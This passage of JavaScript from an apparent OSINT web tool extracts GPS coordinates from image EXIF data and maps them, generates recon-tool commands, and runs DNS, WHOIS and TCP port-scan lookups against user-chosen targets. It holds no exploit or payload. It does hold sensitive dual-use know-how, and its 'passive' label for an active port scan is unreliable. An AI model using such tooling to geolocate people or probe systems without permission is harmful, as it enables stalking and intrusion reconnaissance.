        rowsHtml += `<tr><td style="color:var(--yellow); font-weight:700; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05);">${esc(key)}</td><td style="font-family:var(--mono); color:#fff; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05);">${esc(String(tags[key]))}</td></tr>`;
      }
    }
    
    let gpsHtml = '';
    if (tags.GPSInfo) {
      const gps = tags.GPSInfo;
      const lat = parseGPSCoordinate(gps.GPSLatitude, gps.GPSLatitudeRef);
      const lon = parseGPSCoordinate(gps.GPSLongitude, gps.GPSLongitudeRef);
      
      if (lat !== null && lon !== null) {
        badgesHtml += `<span style="background: rgba(234,179,8,0.2); border: 1px solid rgba(234,179,8,0.4); color: #facc15; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 12px;">GPS Encoded</span>`;
        const latDMS = formatDMS(gps.GPSLatitude, gps.GPSLatitudeRef);
        const lonDMS = formatDMS(gps.GPSLongitude, gps.GPSLongitudeRef);
        
        gpsHtml = `
          <div style="font-size:12px; color:var(--text2); line-height:1.6; display: flex; flex-direction: column; gap: 8px;">
            <div style="background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: var(--r); padding: 10px;">
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 4px; margin-bottom: 4px;">
                <span style="color: var(--text3);">Latitude</span>
                <span style="font-family: var(--mono); color: #fff; font-weight: 700;">${lat.toFixed(6)}° (${gps.GPSLatitudeRef || 'N'})</span>
              </div>
              <div style="display: flex; justify-content: space-between; font-size: 11px;">
                <span style="color: var(--text3);">DMS</span>
                <span style="font-family: var(--mono); color: var(--text2);">${latDMS}</span>
              </div>
            </div>
            
            <div style="background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: var(--r); padding: 10px;">
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 4px; margin-bottom: 4px;">
                <span style="color: var(--text3);">Longitude</span>
                <span style="font-family: var(--mono); color: #fff; font-weight: 700;">${lon.toFixed(6)}° (${gps.GPSLongitudeRef || 'E'})</span>
              </div>
              <div style="display: flex; justify-content: space-between; font-size: 11px;">
                <span style="color: var(--text3);">DMS</span>
                <span style="font-family: var(--mono); color: var(--text2);">${lonDMS}</span>
              </div>
            </div>

            <div style="width: 100%; height: 210px; border-radius: var(--r); overflow: hidden; border: 1px solid var(--border); position: relative; margin-top: 4px; background: #000;">
              <iframe 
                width="100%" 
                height="100%" 
                frameborder="0" 
                scrolling="no" 
                marginheight="0" 
                marginwidth="0" 
                src="https://www.openstreetmap.org/export/embed.html?bbox=${(lon - 0.005).toFixed(5)}%2C${(lat - 0.005).toFixed(5)}%2C${(lon + 0.005).toFixed(5)}%2C${(lat + 0.005).toFixed(5)}&amp;layer=mapnik&amp;marker=${lat.toFixed(6)}%2C${lon.toFixed(6)}" 
                style="filter: invert(0.92) hue-rotate(180deg) brightness(0.9) contrast(1.1); border: 0; opacity: 0.85;">
              </iframe>
            </div>

            <div style="display: flex; gap: 8px; margin-top: 8px;">
              <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn btn-primary" style="flex: 1; font-size:11px; padding:8px; display:inline-flex; align-items:center; justify-content: center; gap:6px; text-decoration:none; color: #fff;">
                🗺️ Google Maps
              </a>
              <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=16/${lat}/${lon}" target="_blank" class="btn" style="flex: 1; font-size:11px; padding:8px; display:inline-flex; align-items:center; justify-content: center; gap:6px; text-decoration:none; border: 1px solid var(--border); background: var(--bg2); color: var(--text1);">
                🌐 OpenStreetMap
              </a>
            </div>
          </div>
        `;
      }
    }
    
    if (!gpsHtml) {
      gpsHtml = `
        <div class="empty-state" style="padding:24px 0; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px dashed rgba(255,255,255,0.05); border-radius: var(--r); background: rgba(0,0,0,0.1);">
          <div class="es-icon" style="font-size:32px; margin-bottom: 8px;">🛡️</div>
          <div style="font-weight: 700; color: var(--text1); font-size: 13px;">No GPS Metadata Found</div>
          <div class="es-sub" style="font-size:11px; color:var(--text3); max-width: 240px; margin: 4px auto 0 auto; line-height: 1.4;">
            This image is sanitised of geolocation coordinates or has no GPS EXIF tags embedded.
          </div>
        </div>
      `;
    }
    
    if (metaBadges) {
      metaBadges.innerHTML = badgesHtml;
    }
    
    if (asciiConsole) {
      if (asciiMeta.length > 0) {
        asciiMeta = [...new Set(asciiMeta)].slice(0, 20);
        asciiConsole.textContent = asciiMeta.join('\n');
      } else {
        asciiConsole.textContent = 'No suspicious metadata strings matched via signature scanners.';
      }
    }
    
    tableBody.innerHTML = rowsHtml;
    gpsDetails.innerHTML = gpsHtml;
  };
  reader.readAsArrayBuffer(file);
}

function parseGPSCoordinate(rationalArray, ref) {
  if (!rationalArray || rationalArray.length < 3) return null;
  const degrees = rationalArray[0];
  const minutes = rationalArray[1];
  const seconds = rationalArray[2];
  let dec = degrees + (minutes / 60) + (seconds / 3600);
  if (ref === 'S' || ref === 'W') {
    dec = -dec;
  }
  return dec;
}

function formatDMS(rationalArray, ref) {
  if (!rationalArray || rationalArray.length < 3) return '';
  const deg = rationalArray[0];
  const min = rationalArray[1];
  const sec = rationalArray[2];
  return `${deg}° ${min}' ${sec.toFixed(2)}" ${ref || ''}`;
}

function parsePngMetadata(arrayBuffer) {
  const view = new DataView(arrayBuffer);
  if (view.byteLength < 8) return null;
  if (view.getUint32(0) !== 0x89504E47 || view.getUint32(4) !== 0x0D0A1A0A) {
    return null;
  }
  const tags = {};
  let offset = 8;
  const length = view.byteLength;
  while (offset < length - 12) {
    const chunkLength = view.getUint32(offset, false);
    const chunkType = String.fromCharCode(
      view.getUint8(offset + 4),
      view.getUint8(offset + 5),
      view.getUint8(offset + 6),
      view.getUint8(offset + 7)
    );
    if (chunkType === 'IEND') break;
    if (chunkLength < 0 || offset + 12 + chunkLength > length) {
      break; 
    }
    if (chunkType === 'tEXt') {
      try {
        let key = '';
        let idx = offset + 8;
        const limit = offset + 8 + chunkLength;
        while (idx < limit) {
          const b = view.getUint8(idx);
          if (b === 0) {
            idx++;
            break;
          }
          key += String.fromCharCode(b);
          idx++;
        }
        let val = '';
        while (idx < limit) {
          val += String.fromCharCode(view.getUint8(idx));
          idx++;
        }
        if (key && val) {
          tags[key] = val;
        }
      } catch (e) {
        console.error('Error parsing tEXt chunk', e);
      }
    } else if (chunkType === 'iTXt') {
      try {
        let idx = offset + 8;
        const limit = offset + 8 + chunkLength;
        let key = '';
        while (idx < limit) {
          const b = view.getUint8(idx);
          if (b === 0) {
            idx++;
            break;
          }
          key += String.fromCharCode(b);
          idx++;
        }
        if (idx + 2 < limit) {
          const compressionFlag = view.getUint8(idx);
          idx += 2;
          while (idx < limit && view.getUint8(idx) !== 0) {
            idx++;
          }
          idx++; 
          while (idx < limit && view.getUint8(idx) !== 0) {
            idx++;
          }
          idx++; 
          if (compressionFlag === 0 && idx < limit) {
            const utf8Bytes = new Uint8Array(arrayBuffer, idx, limit - idx);
            const val = new TextDecoder('utf-8').decode(utf8Bytes);
            if (key && val) {
              tags[key] = val;
            }
          }
        }
      } catch (e) {
        console.error('Error parsing iTXt chunk', e);
      }
    } else if (chunkType === 'tIME') {
      try {
        const year = view.getUint16(offset + 8, false);
        const month = view.getUint8(offset + 10);
        const day = view.getUint8(offset + 11);
        const hour = view.getUint8(offset + 12);
        const minute = view.getUint8(offset + 13);
        const second = view.getUint8(offset + 14);
        tags['Modification Time (tIME)'] = `${year}-${String(month).padStart(2, '0')}-${String(day).padStart(2, '0')} ${String(hour).padStart(2, '0')}:${String(minute).padStart(2, '0')}:${String(second).padStart(2, '0')}`;
      } catch (e) {}
    } else if (chunkType === 'pHYs') {
      try {
        const ppuX = view.getUint32(offset + 8, false);
        const ppuY = view.getUint32(offset + 12, false);
        const unit = view.getUint8(offset + 16);
        const unitStr = unit === 1 ? 'meters' : 'unknown units';
        tags['Resolution (pHYs)'] = `${ppuX}x${ppuY} pixels per ${unitStr}`;
      } catch (e) {}
    }
    offset += 12 + chunkLength;
  }
  return tags;
}

function parseExif(arrayBuffer) {
  const view = new DataView(arrayBuffer);
  if (view.byteLength < 4 || view.getUint16(0, false) !== 0xFFD8) return null;
  
  let offset = 2;
  const length = view.byteLength;
  while (offset < length - 2) {
    const marker = view.getUint16(offset, false);
    if (marker === 0xFFE1) {
      return readExifData(view, offset + 4);
    }
    offset += 2 + view.getUint16(offset + 2, false);
  }
  return null;
}

function readExifData(view, offset) {
  if (offset + 6 > view.byteLength) return null;
  if (view.getUint32(offset) !== 0x45786966 || view.getUint16(offset + 4) !== 0) {
    return null;
  }
  
  const tiffOffset = offset + 6;
  let bigEndian = true;
  const tiffHeader = view.getUint16(tiffOffset);
  if (tiffHeader === 0x4949) {
    bigEndian = false;
  } else if (tiffHeader === 0x4D4D) {
    bigEndian = true;
  } else {
    return null;
  }
  
  if (view.getUint16(tiffOffset + 2, !bigEndian) !== 0x002A) {
    return null;
  }
  
  const firstIFDOffset = view.getUint32(tiffOffset + 4, !bigEndian);
  if (firstIFDOffset < 8) return null;
  
  const tags = {};
  readIFD(view, tiffOffset, firstIFDOffset, bigEndian, tags);
  return tags;
}

function readIFD(view, tiffOffset, ifdOffset, bigEndian, tags, isGps = false) {
  try {
    if (tiffOffset + ifdOffset + 2 > view.byteLength) return;
    const numEntries = view.getUint16(tiffOffset + ifdOffset, !bigEndian);
    let entryOffset = ifdOffset + 2;
    
    for (let i = 0; i < numEntries; i++) {
      if (tiffOffset + entryOffset + 12 > view.byteLength) break;
      const tag = view.getUint16(tiffOffset + entryOffset, !bigEndian);
      const type = view.getUint16(tiffOffset + entryOffset + 2, !bigEndian);
      const count = view.getUint32(tiffOffset + entryOffset + 4, !bigEndian);
      const valueOffset = view.getUint32(tiffOffset + entryOffset + 8, !bigEndian);
      
      const tagMap = isGps ? gpsTags : exifTags;
      const tagName = tagMap[tag];
      
      if (tagName) {
        if (tagName === 'GPSInfo') {
          const gpsIFDOffset = valueOffset;
          const gpsTagsObj = {};
          readIFD(view, tiffOffset, gpsIFDOffset, bigEndian, gpsTagsObj, true);
          tags['GPSInfo'] = gpsTagsObj;
        } else {
          const val = readTagValue(view, tiffOffset, type, count, valueOffset, bigEndian);
          tags[tagName] = val;
        }
      }
      entryOffset += 12;
    }
  } catch(ex) {
    console.error('Error reading IFD', ex);
  }
}

function readTagValue(view, tiffOffset, type, count, valueOffset, bigEndian) {
  try {
    if (type === 2) { // ASCII String
      if (count > 4) {
        if (tiffOffset + valueOffset + count > view.byteLength) return null;
        let out = '';
        for (let i = 0; i < count - 1; i++) {
          out += String.fromCharCode(view.getUint8(tiffOffset + valueOffset + i));
        }
        return out;
      } else {
        let out = '';
        let temp = valueOffset;
        if (bigEndian) {
          for (let i = 0; i < count - 1; i++) {
            out += String.fromCharCode((temp >>> (24 - i * 8)) & 0xFF);
          }
        } else {
          for (let i = 0; i < count - 1; i++) {
            out += String.fromCharCode((temp >>> (i * 8)) & 0xFF);
          }
        }
        return out;
      }
    }
    
    if (type === 3) { // Short (16-bit)
      return bigEndian ? (valueOffset >>> 16) : (valueOffset & 0xFFFF);
    }
    
    if (type === 4) { // Long (32-bit)
      return valueOffset;
    }
    
    if (type === 5) { // Rational (two 32-bit uints)
      if (count === 1) {
        if (tiffOffset + valueOffset + 8 > view.byteLength) return null;
        const num = view.getUint32(tiffOffset + valueOffset, !bigEndian);
        const den = view.getUint32(tiffOffset + valueOffset + 4, !bigEndian);
        return den === 0 ? 0 : num / den;
      } else {
        const arr = [];
        for (let i = 0; i < count; i++) {
          if (tiffOffset + valueOffset + i * 8 + 8 > view.byteLength) break;
          const num = view.getUint32(tiffOffset + valueOffset + i * 8, !bigEndian);
          const den = view.getUint32(tiffOffset + valueOffset + i * 8 + 4, !bigEndian);
          arr.push(den === 0 ? 0 : num / den);
        }
        return arr;
      }
    }
  } catch(ex) {
    console.error('Error reading tag value', ex);
  }
  return null;
}

// 6. CLI Command Generator Sub-renderer
function renderCliSec() {
  const select = document.getElementById('osint-cli-tool-select');
  if (!select) return;
  
  const toolKey = select.value;
  const tool = cliToolsData[toolKey];
  if (!tool) return;
  
  const inp = document.getElementById('osint-cli-target-input');
  if (inp) {
    inp.placeholder = tool.targetLabel;
    if (!inp.value || inp.getAttribute('data-prev-tool') !== toolKey) {
      const globalTarget = document.getElementById('global-target')?.value.trim();
      const label = tool.targetLabel.toLowerCase();
      const isDomainOrUrl = label.includes('domain') || 
                            label.includes('host') || 
                            label.includes('url') || 
                            label.includes('git') ||
                            label.includes('target');
      if (globalTarget && isDomainOrUrl) {
        inp.value = globalTarget;
      } else {
        inp.value = tool.defaultTarget;
      }
    }
    inp.setAttribute('data-prev-tool', toolKey);
  }
  
  const optionsWrap = document.getElementById('osint-cli-options-wrap');
  if (optionsWrap && optionsWrap.getAttribute('data-tool') !== toolKey) {
    optionsWrap.setAttribute('data-tool', toolKey);
    optionsWrap.innerHTML = `
      <label class="form-label" style="margin-top:10px;">Select Options</label>
      <div style="display:flex; flex-direction:column; gap:8px; background:var(--bg3); padding:10px; border-radius:var(--r); border:1px solid var(--border);">
        ${tool.options.map((o, idx) => `
          <label style="display:flex; align-items:center; gap:8px; font-size:12px; color:var(--text2); cursor:pointer; margin-bottom:0;">
            <input type="checkbox" class="cli-option-chk" data-flag="${o.flag}" onchange="renderCliCommand()" ${idx === 0 ? 'checked' : ''}>
            <div>
              <strong>${o.label}</strong> — <span style="font-size:11px; color:var(--text3);">${o.desc}</span>
            </div>
          </label>
        `).join('')}
      </div>
    `;
  }
  
  renderCliCommand();
}

window.renderCliCommand = function() {
  const select = document.getElementById('osint-cli-tool-select');
  if (!select) return;
  
  const toolKey = select.value;
  const tool = cliToolsData[toolKey];
  if (!tool) return;
  
  const info = document.getElementById('osint-cli-tool-info');
  if (info) {
    info.innerHTML = `
      <div style="font-weight:700; color:#fff; margin-bottom:4px;">${tool.name.toUpperCase()}</div>
      <div>${tool.desc}</div>
      <div style="margin-top:10px; font-size:11.5px; color:var(--text3);">
        <strong>Installation:</strong>
        <code style="display:block; background:#000; padding:8px; border-radius:4px; margin-top:4px; white-space:pre-wrap; font-family:var(--mono); border:1px solid var(--border); color:#38bdf8; line-height:1.4;">${tool.install}</code>
      </div>
    `;
  }
  
  const inp = document.getElementById('osint-cli-target-input');
  const target = (inp && inp.value.trim()) || tool.defaultTarget;
  
  const selectedFlags = [];
  document.querySelectorAll('.cli-option-chk').forEach(chk => {
    if (chk.checked) {
      selectedFlags.push(chk.getAttribute('data-flag'));
    }
  });
  
  const cmdStr = tool.cmdBuilder(target, selectedFlags);
  const code = document.getElementById('osint-cli-command-code');
  if (code) {
    code.textContent = cmdStr;
  }
};

window.copyCliCommand = function() {
  const code = document.getElementById('osint-cli-command-code');
  if (code) {
    navigator.clipboard.writeText(code.textContent).then(() => {
      toast('Command copied to clipboard!', 'success');
    });
  }
};


// ─────────────────────────────────────────────────────────────────
// INTERACTIVE PASSIVE OSINT API TRIGGERS (DNS, WHOIS, PORTSCAN)
// ─────────────────────────────────────────────────────────────────

window.lookupDnsRecords = async function() {
  const domain = window.osintTargetDomain;
  if (!domain) {
    toast('Please enter a target domain first!', 'error');
    const inp = document.getElementById('osint-target');
    if (inp) inp.focus();
    return;
  }
  
  const container = document.getElementById('dns-lookup-result');
  if (!container) return;
  
  container.innerHTML = `
    <div style="text-align:center; padding:20px;">
      <div class="pulse-dot" style="display:inline-block;"></div>
      <div style="color:var(--text3); font-size:12px; margin-top:8px;">Querying Cloudflare DNS records...</div>
    </div>
  `;
  
  try {
    const res = await fetch('/api/osint/dns', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ domain })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Failed to resolve DNS');
    
    let html = `
      <table class="table" style="width:100%; font-size:12px; border-collapse: collapse;">
        <thead>
          <tr style="border-bottom:1px solid var(--border);">
            <th style="text-align:left; padding:8px; color:var(--text3);">Type</th>
            <th style="text-align:left; padding:8px; color:var(--text3);">Name</th>
            <th style="text-align:left; padding:8px; color:var(--text3);">Value / Data</th>
            <th style="text-align:left; padding:8px; color:var(--text3);">TTL</th>
          </tr>
        </thead>
        <tbody>
    `;
    
    let hasRecords = false;
    for (const [rtype, records] of Object.entries(data.records)) {
      if (records && records.length > 0) {
        records.forEach(rec => {
          if (rec.error) {
            html += `
              <tr style="border-bottom:1px solid var(--border); opacity:0.6;">
                <td style="padding:8px; font-weight:700; color:var(--red);">${esc(rtype)}</td>
                <td colspan="3" style="padding:8px; font-family:var(--mono); color:var(--red);">${esc(rec.error)}</td>
              </tr>
            `;
          } else {
            hasRecords = true;
            html += `
              <tr style="border-bottom:1px solid var(--border);">
                <td style="padding:8px; font-weight:700; color:var(--accent);">${esc(rtype)}</td>
                <td style="padding:8px; font-family:var(--mono); color:#fff; word-break:break-all;">${esc(rec.name)}</td>
                <td style="padding:8px; font-family:var(--mono); color:var(--text1); word-break:break-all;">${esc(rec.data)}</td>
                <td style="padding:8px; font-family:var(--mono); color:var(--text3);">${rec.TTL}</td>
              </tr>
            `;
          }
        });
      }
    }
    
    if (!hasRecords) {
      html += `
        <tr>
          <td colspan="4" style="text-align:center; padding:20px; color:var(--text3);">No active DNS records found for this domain</td>
        </tr>
      `;
    }
    
    html += `</tbody></table>`;
    container.innerHTML = html;
    toast('DNS resolution complete!', 'success');
  } catch (err) {
    container.innerHTML = `
      <div class="empty-state" style="padding:16px 0;">
        <div class="es-sub" style="color:var(--red);">${esc(err.message)}</div>
      </div>
    `;
    toast(err.message, 'error');
  }
};

window.lookupWhoisDetails = async function() {
  const domain = window.osintTargetDomain;
  if (!domain) {
    toast('Please enter a target domain first!', 'error');
    const inp = document.getElementById('osint-target');
    if (inp) inp.focus();
    return;
  }
  
  const container = document.getElementById('whois-lookup-result');
  if (!container) return;
  
  container.innerHTML = `
    <div style="text-align:center; padding:20px;">
      <div class="pulse-dot" style="display:inline-block;"></div>
      <div style="color:var(--text3); font-size:12px; margin-top:8px;">Querying RDAP/WHOIS servers...</div>
    </div>
  `;
  
  try {
    const res = await fetch('/api/osint/whois', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ domain })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Failed to query RDAP WHOIS');
    
    const events = data.events || {};
    const created = events.registration ? new Date(events.registration).toLocaleString() : 'Unknown';
    const updated = events.lastChanged ? new Date(events.lastChanged).toLocaleString() : 'Unknown';
    const expires = events.expiration ? new Date(events.expiration).toLocaleString() : 'Unknown';
    
    let nameserversHtml = data.nameservers && data.nameservers.length > 0 
      ? data.nameservers.map(ns => `<div>🛡️ <code>${esc(ns)}</code></div>`).join('') 
      : 'No nameservers found';
      
    let statusHtml = data.status && data.status.length > 0 
      ? data.status.map(s => `<span class="username-badge notfound" style="margin-right:4px; font-size:10px; padding:2px 6px; background:rgba(255,255,255,0.05); border:1px solid var(--border);">${esc(s)}</span>`).join('')
      : 'No status information';

    container.innerHTML = `
      <div style="display:flex; flex-direction:column; gap:12px; font-size:12.5px; line-height:1.5;">
        <div><strong style="color:var(--text3);">Domain:</strong> <span style="font-family:var(--mono); color:#fff; font-weight:700;">${esc(data.domain)}</span></div>
        <div><strong style="color:var(--text3);">Registrar:</strong> <span style="color:var(--accent); font-weight:700;">${esc(data.registrar)}</span></div>
        <div><strong style="color:var(--text3);">Registration Date:</strong> <span style="color:#fff;">${esc(created)}</span></div>
        <div><strong style="color:var(--text3);">Last Changed Date:</strong> <span style="color:#fff;">${esc(updated)}</span></div>
        <div><strong style="color:var(--text3);">Expiration Date:</strong> <span style="color:#fff;">${esc(expires)}</span></div>
        <div style="margin-top:4px;">
          <strong style="color:var(--text3);">Name Servers:</strong>
          <div style="margin-top:4px; display:flex; flex-direction:column; gap:4px;">${nameserversHtml}</div>
        </div>
        <div style="margin-top:4px;">
          <strong style="color:var(--text3);">Domain Status:</strong>
          <div style="margin-top:6px; display:flex; flex-wrap:wrap; gap:4px;">${statusHtml}</div>
        </div>
      </div>
    `;
    toast('WHOIS data retrieved!', 'success');
  } catch (err) {
    container.innerHTML = `
      <div class="empty-state" style="padding:16px 0;">
        <div class="es-sub" style="color:var(--red);">${esc(err.message)}</div>
      </div>
    `;
    toast(err.message, 'error');
  }
};

window.runPortScan = async function() {
  const ip = window.osintTargetIP;
  if (!ip) {
    toast('Please enter an IP address first!', 'error');
    const inp = document.getElementById('osint-ip-input');
    if (inp) inp.focus();
    return;
  }
  
  const container = document.getElementById('port-scan-result');
  if (!container) return;
  
  container.innerHTML = `
    <div style="text-align:center; padding:20px;">
      <div class="pulse-dot" style="display:inline-block;"></div>
      <div style="color:var(--text3); font-size:12px; margin-top:8px;">Performing passive TCP port scan (approx. 2 seconds)...</div>
    </div>
  `;
  
  try {
    const res = await fetch('/api/osint/portscan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Failed to complete port scan');
    
    let html = `
      <div style="display:grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; margin-top: 10px;">
    `;
    
    data.ports.forEach(p => {
      const isOpen = p.status === 'open';
      const badgeColor = isOpen ? 'rgba(34,197,94,0.1)' : 'rgba(255,255,255,0.03)';
      const borderColor = isOpen ? 'rgba(34,197,94,0.3)' : 'var(--border)';
      const textColor = isOpen ? '#22c55e' : 'var(--text3)';
      const statusText = isOpen ? 'OPEN 🟢' : 'CLOSED';
      
      html += `
        <div style="background:${badgeColor}; border:1px solid ${borderColor}; padding:10px; border-radius:var(--r); text-align:center;">
          <div style="font-family:var(--mono); font-size:14px; font-weight:700; color:#fff;">Port ${p.port}</div>
          <div style="font-size:11px; font-weight:600; color:var(--text2); margin-top:2px;">${esc(p.service)}</div>
          <div style="font-size:10px; font-weight:700; color:${textColor}; margin-top:6px; letter-spacing:0.5px;">${statusText}</div>
        </div>
      `;
    });
    
    html += `</div>`;
    container.innerHTML = html;
    toast('Port scan completed successfully!', 'success');
  } catch (err) {
    container.innerHTML = `
      <div class="empty-state" style="padding:16px 0;">
        <div class="es-sub" style="color:var(--red);">${esc(err.message)}</div>
      </div>
    `;
    toast(err.message, 'error');
  }
};
